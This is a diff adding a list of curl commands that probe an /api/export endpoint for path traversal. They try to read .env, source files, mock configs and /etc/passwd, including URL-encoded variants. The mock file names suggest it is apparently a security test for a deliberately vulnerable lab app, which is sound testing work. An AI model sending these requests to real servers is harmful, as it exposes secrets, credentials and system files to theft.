@@ -1,0 +1,22 @@
+# Try to read internal mock config
+curl "{BASE_URL}/api/export?file=../uploads/internal-config.xml"
+
+# Try to read the backend source code
+curl "{BASE_URL}/api/export?file=../server.js"
+curl "{BASE_URL}/api/export?file=../routes/upload.js"
+curl "{BASE_URL}/api/export?file=../models/Document.js"
+
+# Try to read application configuration
+curl "{BASE_URL}/api/export?file=../.env"
+curl "{BASE_URL}/api/export?file=../package.json"
+
+# Try to read fake environment mock file you added
+curl "{BASE_URL}/api/export?file=../uploads/env.prod"
+
+# Try to read system files
+curl "{BASE_URL}/api/export?file=../../../../etc/passwd"
+curl "{BASE_URL}/api/export?file=../../../../etc/hostname"
+
+# URL-encoded traversal attempts
+curl "{BASE_URL}/api/export?file=..%2F..%2F..%2F..%2Fuploads%2Finternal-config.xml"
+curl "{BASE_URL}/api/export?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
